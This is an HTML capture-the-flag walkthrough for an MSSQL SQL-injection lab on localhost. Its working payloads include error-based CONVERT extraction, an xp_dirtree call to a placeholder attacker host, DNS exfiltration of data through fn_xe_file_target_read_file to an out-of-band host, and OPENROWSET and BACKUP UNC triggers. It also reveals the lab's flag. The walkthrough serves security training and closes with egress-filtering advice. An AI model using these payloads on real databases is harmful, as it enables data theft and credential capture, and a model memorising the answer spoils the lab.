<h4>Step 1: Test Normal Lookup</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Lookup</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab12" \<br> --data-urlencode "host=web-01"<br><br>
        <span class="prompt">Input: </span>web-01<br>
        <span class="prompt">SQL: </span>SELECT hostname, cpu_usage, memory_usage, disk_io FROM metrics WHERE hostname = 'web-01'<br><br>
        <span class="prompt">Output:</span><br>
        <strong>web-01</strong> &bull; CPU: 45.20% &bull; Memory: 72.10% &bull; Disk I/O: 125.50 MB/s
    </div>
</div>

<h4>Step 2: Confirm Injection and Discover Blocks</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Error + WAF Detection</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "..." --data-urlencode "host='"<br>
        <span class="prompt">Input: </span>'<br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[42000]: Unclosed quotation mark after the character string '''.</strong><br><br>
        <span class="prompt">$ </span>curl -s "..." --data-urlencode "host='; EXEC xp_dirtree '\\test.attacker.com\x'; -- -"<br>
        <span class="prompt">Input: </span>'; EXEC xp_dirtree '\\test.attacker.com\x'; -- -<br>
        <span class="prompt">Result: </span><strong>Blocked: Extended stored procedures are disabled.</strong><br>
        <span class="prompt">// xp_dirtree, xp_fileexist, xp_subdirs are all blocked!</span>
    </div>
</div>

<h4>Step 3: Extract Flag via CONVERT</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. CONVERT Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab12" \<br> --data-urlencode "host=' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
        <span class="prompt">Input: </span>' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -<br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_fn_x3_f1l3_unc}' to data type int.</strong>
    </div>
</div>

<h4>Step 4: OOB via fn_xe_file_target_read_file</h4>
<p>
    <code>sys.fn_xe_file_target_read_file()</code> reads Extended Events logs and accepts
    UNC paths. This bypasses the xp_dirtree block because it's a different function.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4: fn_xe_file OOB</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Basic OOB test (not blocked by filter!):</span><br>
        <span class="prompt">Input: </span>'; SELECT * FROM sys.fn_xe_file_target_read_file('\\test.xxxxx.oast.fun\share\log.xel', NULL, NULL, NULL); -- -<br>
        <span class="prompt">Response: </span>No metrics found (stacked query executed, DNS triggered)<br><br>
        <span class="prompt">// Exfiltrate data via DNS subdomain:</span><br>
        <span class="prompt">Input: </span>'; DECLARE @d VARCHAR(100); SELECT @d=(SELECT TOP 1 flag FROM flags); DECLARE @p VARCHAR(200); SET @p='\\' + @d + '.xxxxx.oast.fun\share\log.xel'; SELECT * FROM sys.fn_xe_file_target_read_file(@p, NULL, NULL, NULL); -- -<br><br>
        <span class="prompt">DNS captures: </span><strong>FLAG{ms_fn_x3_f1l3_unc}.xxxxx.oast.fun</strong>
    </div>
</div>

<h4>Step 5: Other Stealthy UNC Path Functions</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Alternative UNC Triggers</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// OPENROWSET with UNC path:</span><br>
        <span class="prompt">Input: </span>'; SELECT * FROM OPENROWSET(BULK '\\data.xxxxx.oast.fun\share\x', SINGLE_CLOB) AS f(d); -- -<br><br>
        <span class="prompt">// BACKUP to UNC (triggers SMB auth):</span><br>
        <span class="prompt">Input: </span>'; BACKUP DATABASE sqli_arena_mssql_lab12 TO DISK='\\data.xxxxx.oast.fun\share\bak'; -- -<br><br>
        <span class="prompt">// All bypass xp_dirtree filter -- keyword blocking is insufficient!</span>
    </div>
</div>

<h4>Step 6: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{ms_fn_x3_f1l3_unc}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Quick Solve</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab12" \<br> --data-urlencode "host=' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
        <span class="prompt">Output: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_fn_x3_f1l3_unc}' to data type int.</strong>
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Even when <code>xp_dirtree</code> and similar extended
    procedures are blocked, MSSQL has many other functions that accept UNC paths:
    <code>sys.fn_xe_file_target_read_file()</code>, <code>OPENROWSET(BULK)</code>,
    <code>BACKUP</code>, and <code>RESTORE</code>. Application-level keyword blocking
    is insufficient: there are too many alternative paths. Block outbound SMB (port 445)
    at the firewall level and restrict DNS egress to mitigate OOB attacks.
</div>
